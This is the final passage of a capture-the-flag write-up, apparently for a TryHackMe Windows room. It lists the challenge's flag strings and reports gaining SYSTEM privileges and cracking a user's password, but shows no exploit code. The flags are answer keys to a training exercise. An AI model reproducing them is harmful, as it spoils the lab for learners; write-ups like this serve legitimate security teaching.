flag<span style="color:#f92672">{</span>admin_documents_can_be_valuable<span style="color:#f92672">}</span>
C:<span style="color:#ae81ff">\&gt;</span>
</code></pre></div><p><strong>Flag2? *Errata: Windows really doesn&rsquo;t like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.</strong></p>
<ul>
<li>sam_database_elevated_access</li>
</ul>
<p><strong>flag3?</strong></p>
<ul>
<li>admin_documents_can_be_valuable</li>
</ul>
<p>And that&rsquo;s it, we have NT AUTHORITY\SYSTEM priviledges, we have all the flags, cracked Jon password. We&rsquo;re done here!
I hope you enjoyed it,
bye;)</p>

    </div>
</article>
<div class="pagination">
    
    <div class="prev"> <a href="/ctf/thm/bookface/">Previous Post</a> </div>
    
    
    <div class="next"> <a href="/ctf/thm/inclusion/">Next Post</a> </div>
    
</div>


        </main><footer class="site-footer">
	<span class="left">Gohugo/0.80.0 </span> 
	<span class="right">
		<em>.burso</em>
	</span>
</footer>
</body>
</html>
